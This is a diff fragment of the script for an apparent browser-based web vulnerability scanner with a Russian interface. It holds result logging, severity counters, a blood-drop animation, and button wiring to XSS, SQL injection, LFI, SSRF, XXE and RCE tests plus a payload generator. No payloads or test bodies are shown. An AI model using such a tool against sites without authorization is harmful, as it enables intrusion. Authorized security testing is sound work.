+            iconEl.className = `fas fa-${icon} mt-1`;
+            if (level === 'critical') iconEl.classList.add('text-danger');
+            else iconEl.classList.add(`text-${level}`);
+            
+            const messageContainer = document.createElement('div');
+            messageContainer.className = 'flex-1';
+            
+            const messageEl = document.createElement('p');
+            messageEl.className = 'text-sm';
+            messageEl.textContent = message;
+            
+            const timestamp = document.createElement('span');
+            timestamp.className = 'text-xs opacity-75 mt-1 block';
+            timestamp.textContent = new Date().toLocaleTimeString();
+            
+            messageContainer.appendChild(messageEl);
+            messageContainer.appendChild(timestamp);
+            result.appendChild(iconEl);
+            result.appendChild(messageContainer);
+            
+            resultsDiv.appendChild(result);
+            resultsDiv.scrollTop = resultsDiv.scrollHeight;
+            
+            if (level === 'critical' || level === 'high' || level === 'medium' || level === 'low') {
+                vulnerabilitiesFound++;
+                switch (level) {
+                    case 'critical': criticalCount++; break;
+                    case 'high': highCount++; break;
+                    case 'medium': mediumCount++; break;
+                    case 'low': lowCount++; break;
+                }
+                updateVulnerabilityCounters();
+            }
+            
+            return result;
+        }
+
+        function createBloodEffect() {
+            const bloodDrop = document.createElement('div');
+            bloodDrop.className = 'blood-drop blood-animation';
+            bloodDrop.style.left = `${Math.random() * 100}%`;
+            document.body.appendChild(bloodDrop);
+            
+            setTimeout(() => {
+                bloodDrop.remove();
+            }, 1000);
+        }
+
+        function sanitizeHTML(str) {
+            const temp = document.createElement('div');
+            temp.textContent = str;
+            return temp.innerHTML;
+        }
+
+        function updateProgress(percent) {
+            globalProgress.style.width = percent + '%';
+        }
+
+        function updateVulnerabilityCounters() {
+            vulnCounterEl.textContent = vulnerabilitiesFound;
+            document.getElementById('criticalCount').textContent = criticalCount;
+            document.getElementById('highCount').textContent = highCount;
+            document.getElementById('mediumCount').textContent = mediumCount;
+            document.getElementById('lowCount').textContent = lowCount;
+        }
+
+        function resetStatus() {
+            isTesting = false;
+            currentTest = null;
+            updateStatus('Готов к тестированию');
+            updateProgress(0);
+        }
+
+        function stopTests() {
+            if (isTesting) {
+                isTesting = false;
+                addResult('Тестирование принудительно остановлено', 'warning', 'stop-circle');
+                resetStatus();
+            }
+        }
+
+        function initializeEventListeners() {
+            document.getElementById('scanUrl').addEventListener('click', () => {
+                targetInput.dispatchEvent(new Event('change'));
+            });
+
+            const testButtons = {
+                runAllTests: runAllTests,
+                xssTest: xssTest,
+                sqliTest: sqliTest,
+                lfiTest: lfiTest,
+                wafTest: wafTest,
+                headerTest: headerTest,
+                corsTest: corsTest,
+                csrfTest: csrfTest,
+                clickjackingTest: clickjackingTest,
+                idorTest: idorTest,
+                ssrfTest: ssrfTest,
+                xxeTest: xxeTest,
+                rceTest: rceTest,
+                clearResultsBtn: clearResults,
+                stopTestsBtn: stopTests,
+                viewSource: viewSource
+            };
+
+            for (const [id, handler] of Object.entries(testButtons)) {
+                const element = document.getElementById(id);
+                if (element) {
+                    element.addEventListener('click', handler);
+                }
+            }
+
+            document.getElementById('payloadType').addEventListener('change', generatePayload);
+            document.getElementById('payloadEncoding').addEventListener('change', generatePayload);
+            
+            document.getElementById('copyPayload').addEventListener('click', () => {
+                const payload = document.getElementById('generatedPayload');
+                payload.select();
+                document.execCommand('copy');
+                addResult('Пейлоад скопирован в буфер обмена', 'success', 'copy');
+            });
+
+            document.getElementById('exportPDF')?.addEventListener('click', () => {
+                addResult('Экспорт в PDF: в разработке', 'info', 'file-pdf');
+            });
+            
+            document.getElementById('exportCSV')?.addEventListener('click', () => {
+                addResult('Экспорт в CSV: в разработке', 'info', 'file-csv');
+            });
+            
+            document.getElementById('exportHTML')?.addEventListener('click', () => {
+                addResult('Экспорт в HTML: в разработке', 'info', 'code');
+            });
+        }
+    </script>
+</body>
+</html>
